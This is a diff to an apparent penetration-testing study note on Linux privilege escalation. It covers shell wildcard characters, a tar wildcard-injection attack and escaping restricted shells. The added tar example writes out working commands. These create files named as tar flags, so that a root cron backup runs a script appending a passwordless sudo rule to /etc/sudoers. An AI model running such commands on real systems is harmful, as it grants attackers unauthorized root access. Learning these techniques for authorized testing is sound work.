@@ -47,10 +47,29 @@ debugInConsole: false # Print debug info in Obsidian console
 If we can modify a user's path, we could potentially run a malicious version of a binary if it is found earlier in the path. eg. `export PATH=.:${PATH}` will add the current directory.
 
 ## Wildcard Abuse
-| Character | Significance                                    |
-| --------- | ----------------------------------------------- |
-| `*`       | Matches any number of characters in a file name |
-| `?`       | Matches a single character                      |
-| `[ ]`     |                                                 |
-| `~`       |                                                 |
-| `-`       |                                                 |
+| Character | Significance                                                                                            |
+| --------- | ------------------------------------------------------------------------------------------------------- |
+| `*`       | Matches any number of characters in a file name                                                         |
+| `?`       | Matches a single character                                                                              |
+| `[ ]`     | Brackets enclose characters and can match any single one at the defined position                        |
+| `~`       | Expands to the user's home directory or can have another username appended to refer to that user's home |
+| `-`       | A hyphen within brackets will denote a range of characters                                              |
+### Tar flags example
+If we find a backup cron job (that runs every minute) that does something like:
+```bash
+*/01 * * * * cd /home/some-user && tar -zcf /home/some-user/backup.tar.gz *
+```
+We can abuse the `*` wildcard here by creating files with names of the CLI flags.
+```bash
+$ echo 'echo "some-user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+$ echo "" > "--checkpoint-action=exec=sh root.sh"
+$ echo "" > "--checkpoint=1"
+```
+
+## Escaping Restricted Shells
+Restricted shells limit a user's ability to execute commands. They can limit what commands can be run and in what directories. Some examples include `rbash`, `rksh`, `rzsh` in linux and the `Restricted-access Shell` in windows.
+
+Sometimes there are vectors we can use in these shells to run arbitrary commands and escape the shell. For examples:
+Suppose a shell limits us to `ls -l`, we might be able to execute commands as arguments `ls -l $(pwd)`.
+
+We could use features like *command substitution (using backticks)*, *command chaining (`;` `|`)*, *using environment variables to modify commands*, and *shell functions*.
